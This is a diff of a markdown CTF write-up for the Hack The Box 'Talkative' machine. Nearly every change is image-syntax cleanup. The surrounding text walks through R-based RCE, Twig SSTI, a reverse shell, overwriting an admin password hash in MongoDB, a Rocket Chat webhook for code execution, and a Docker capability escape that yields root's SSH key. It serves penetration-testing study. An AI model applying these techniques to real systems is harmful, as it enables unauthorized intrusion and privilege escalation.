@@ -26,11 +26,11 @@ Lots of HTTP ports it seems. We can add `talkative.htb` to our `/etc/hosts` file
 
 Port 80 hosts a normal corporate website:
 
-<figure><img src="../../../.gitbook/assets/image (1926).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1926).png>)
 
 This site had some usernames and emails that we can take note of for now.
 
-<figure><img src="../../../.gitbook/assets/image (1258).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1258).png>)
 
 ```
 matt@talkative.htb
@@ -44,7 +44,7 @@ Other than that, there's nothing much here.
 
 On port 3000, there was a Rocket Chat instance.
 
-<figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(204).png>)
 
 We have no credentials, so let's move on for now.
 
@@ -52,17 +52,17 @@ We have no credentials, so let's move on for now.
 
 On port 8080, I found a Jamovi instance:
 
-<figure><img src="../../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(465).png>)
 
 This is a statistical software that is used for data analytics. The more interesting part is, we can run R code using the Rj editor. R can be used to execute system commands via the `system` function.
 
 {% embed url="https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/system" %}
 
-<figure><img src="../../../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1036).png>)
 
 We now have a very simple RCE on the machine. We can get a reverse shell using a simple `bash` script.
 
-<figure><img src="../../../.gitbook/assets/image (3819).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3819).png>)
 
 ### Docker Enum -> Bolt Creds
 
@@ -150,21 +150,21 @@ $ cat xdata.json | jq
 
 Now that we have some credentials, we need to find the Bolt login page. Normally, this is at the `/bolt` directory. We can find this login page at `talkative.htb/bolt`.
 
-<figure><img src="../../../.gitbook/assets/image (2472).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2472).png>)
 
 We can login with `saul@talkative.htb:jeO09ufhWD<s`.
 
-<figure><img src="../../../.gitbook/assets/image (1516).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1516).png>)
 
 ### Bolt RCE
 
 This version of Bolt doesn't have any obvious vulnerabilities, so let's take a look at the File Management System since that is the most interesting. It appears that we can edit the themes and templates used for this machine:
 
-<figure><img src="../../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(582).png>)
 
 The page seems to use Twig templates to display the webpages:
 
-<figure><img src="../../../.gitbook/assets/image (798).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(798).png>)
 
 This means that we can probably execute code using SSTI via Twig templates. I added this one liner to the script and saved the changes.
 
@@ -174,7 +174,7 @@ This means that we can probably execute code using SSTI via Twig templates. I ad
 
 Then, we need to head to Maintenance > Clear Cache, and reload the main page afterwards. Our listener port would catch a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (1979).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1979).png>)
 
 ### Docker Escape -> User
 
@@ -378,17 +378,14 @@ view_livechat_queue_status
 
 We can view the users present on the Rocket Chat instance.
 
-{% code overflow="wrap" %}
 ```
 rs0:PRIMARY> db.users.find()
 { "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
 { "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y" }, "email" : { "verificationTokens" : [ { "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w", "address" : "saul@talkative.htb", "when" : ISODate("2021-08-10T19:49:48.738Z") } ] }, "resume" : { "loginTokens" : [ ] } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2023-05-01T12:23:09.128Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
 ```
-{% endcode %}
 
 We can sort of make out how there's an `admin` user that has a hashed Bcrypt password. What we can do is replace this with a hash of our own choosing and then login as the admin of Rocket Chat.
 
-{% code overflow="wrap" %}
 ```
 rs0:PRIMARY> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$9bo11GKNB/W2jAxW3a.L4OvmplKUjOfaOKaLpKF6KTikZMidkCkbu"}}}});
 WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
@@ -397,7 +394,6 @@ rs0:PRIMARY> db.users.find()
 { "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
 { "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2a$10$9bo11GKNB/W2jAxW3a.L4OvmplKUjOfaOKaLpKF6KTikZMidkCkbu" } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2023-05-01T12:23:09.128Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
 ```
-{% endcode %}
 
 In this case, I just used a simple password of '12345'. Then we can login to Rocket Chat.
 
@@ -405,19 +401,19 @@ In this case, I just used a simple password of '12345'. Then we can login to Roc
 
 The Rocket Chat dashboard had nothong of interest:
 
-<figure><img src="../../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(871).png>)
 
 I was taking a look at the Administration panel and seeing what I could do, when I found this:
 
-<figure><img src="../../../.gitbook/assets/image (3501).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3501).png>)
 
 This is sort of like plugins for Rocket Chat, and it appears I can add new ones via Webhooks:
 
-<figure><img src="../../../.gitbook/assets/image (3467).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3467).png>)
 
 When we click Incoming, it appears we can run some type of Script here:
 
-<figure><img src="../../../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(640).png>)
 
 Reading the documentation for Rocket Chat, it appears that this runs Javascript code!
 
@@ -448,7 +444,7 @@ curl -X POST -H 'Content-Type: application/json' --data '{"text":"Example messag
 
 Afterwards, we would catch a reverse shell on our listener port:
 
-<figure><img src="../../../.gitbook/assets/image (4041).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4041).png>)
 
 ### Docker Vulnerabilities
 
@@ -524,12 +520,10 @@ nonvoluntary_ctxt_switches:     0
 
 I checked `00000000a80425fd` using `capsh` on my own Kali machine and found that it meant these:
 
-{% code overflow="wrap" %}
 ```
 $ capsh --decode=00000000a80425fd
 0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-{% endcode %}
 
 It seems that we have the `CAP_DAC_READ_SEARCH` capability enabled. This capability allows us to bypass **all** file permissions and read any file. This means **any file, even those outside of the mountspace**. Since this is a Docker and (probably) is mounted on the main machine, this allows us to read all files within the main machine, including the root flag.
 
@@ -615,6 +609,6 @@ chmod 600 id_rsa
 ssh -i id_rsa root@talkative.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(281).png>)
 
 Rooted!
